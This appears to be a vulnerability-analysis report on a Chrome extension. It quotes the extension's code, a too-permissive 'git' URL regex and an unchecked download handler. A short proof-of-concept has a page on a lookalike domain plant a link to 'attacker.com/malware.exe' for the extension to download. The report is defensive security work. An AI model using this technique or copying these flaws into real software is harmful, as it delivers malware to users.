# CoCo Analysis: gpgdgecijngkecfccmpajadipieldapd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate flows)

---

## Sink: fetch_source → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gpgdgecijngkecfccmpajadipieldapd/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';`
Line 989: `chrome.downloads.download({ url: URL.createObjectURL(blob), filename });`

**Code:**

```javascript
// Content script - DOM extraction and user interaction (cs_0.js)
function appendNewItems(ele) {
  let downloadButton = document.createElement("a");
  let originalUrl = ele.href; // <- attacker-controlled via DOM injection

  if (webSiteConfig.type === 'github') {
    viewButton.href = createGithubViewUrl(originalUrl);
    downloadButton.href = viewButton.href; // <- attacker-controlled
    downloadButton.addEventListener("click",(e)=>{
      e.preventDefault();
      downloadGithub(downloadButton.href); // <- sends attacker-controlled URL
    });
  }
}

function runScript() {
  let matches = document.body.querySelectorAll(webSiteConfig.keyElement);
  matches.forEach(element => {
    let fileUri = element.href; // <- attacker can inject elements with malicious hrefs
    if (fileUri.includes(keyword)) {
      appendNewItems(element);
    }
  });
}

function downloadGithub(url){
  chrome.runtime.sendMessage({
    cmd : "download", url: url // <- attacker-controlled URL sent to background
  });
}

// Activation check - vulnerable regex (cs_0.js Line 621)
window.addEventListener('load', ()=>{
  let localURL = window.location;
  let enable = (/^https:\/\/git(lab)?.*/gm).test(localURL); // <- matches "githacker.com", "gitmalicious.com"
  if (enable) {
    observerElement(); // <- starts observing DOM and creates download buttons
  }
});

// Background script - Message handler (bg.js Line 975)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if(request.cmd == "download"){
    const { url } = request; // <- attacker-controlled URL
    const filename = decodeURIComponent(url.match(/(?!\/|\.)[^\/]+$/).shift());
    const extension = filename.replace(/.*\.(?=[^.]+$)/, "");
    const mime = EXTENSION_TO_MIME[extension] || `text/${extension}`;

    fetch(request.url, { // <- fetch from attacker-controlled URL
      mode: "cors",
      credentials: "include"
    }).then(response => response.blob())
      .then(blob => {
        return blob.slice(0, blob.size, mime);
      }).then((blob) => {
        chrome.downloads.download({
          url: URL.createObjectURL(blob), // <- downloads attacker's file
          filename
        });
      });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM manipulation + weak URL validation

**Attack:**

```javascript
// Attacker registers domain: githacker.com
// On https://githacker.com/malicious.html

// Create fake file links that extension will detect
const fakeLink = document.createElement('a');
fakeLink.href = 'https://attacker.com/malware.exe';
fakeLink.className = 'whatever-class-extension-searches-for';
document.body.appendChild(fakeLink);

// Extension's content script runs because URL matches /^https:\/\/git(lab)?.*/
// It creates download buttons for the injected link
// When user clicks "download", extension fetches from attacker.com and downloads malware.exe
```

**Impact:** Arbitrary file download from attacker-controlled URLs. Attacker can:
1. Register domain matching regex (e.g., "githacker.com", "gitevil.com")
2. Inject DOM elements with malicious file URLs
3. Extension creates download UI for attacker's links
4. User clicks download → extension fetches and downloads arbitrary files from attacker's server (malware, exploits, etc.)

The vulnerability exists because:
- Content script runs on <all_urls>
- URL validation regex is too permissive (matches any domain starting with "git")
- Background script accepts file URLs from any content script without origin validation
- Downloads permission allows automatic file downloads
